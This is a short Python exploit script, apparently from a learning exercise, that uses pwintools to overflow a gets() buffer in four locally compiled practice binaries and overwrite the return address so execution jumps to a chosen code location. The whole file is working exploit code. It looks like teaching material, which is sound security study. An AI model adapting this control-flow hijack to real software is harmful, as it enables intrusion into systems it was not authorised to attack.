# 2nd exploit: buffer overflow to jump to a specific code location

from pwintools import *

processes = [
	Process('1_gets_gcc_32.exe'),
	Process('1_gets_gcc_64.exe'),
	Process('1_gets_vs_32.exe'),
	Process('1_gets_vs_64.exe'),
]

offsets = [
	48,
	56,
	40,
	56,
]

# better way?
packer = [
	p32,
	p64,
	p32,
	p64,
]

jumpTargets = [
	0x401612,
	0x40159c,
	0x406FF3,
	0x140006FA4,
]

#for p in processes:
for i in range(len(processes)):
	processes[i].recvuntil(b'name:\r\n')
	processes[i].sendline(b'a'*offsets[i] + packer[i](jumpTargets[i]))
	print(processes[i].recvall())
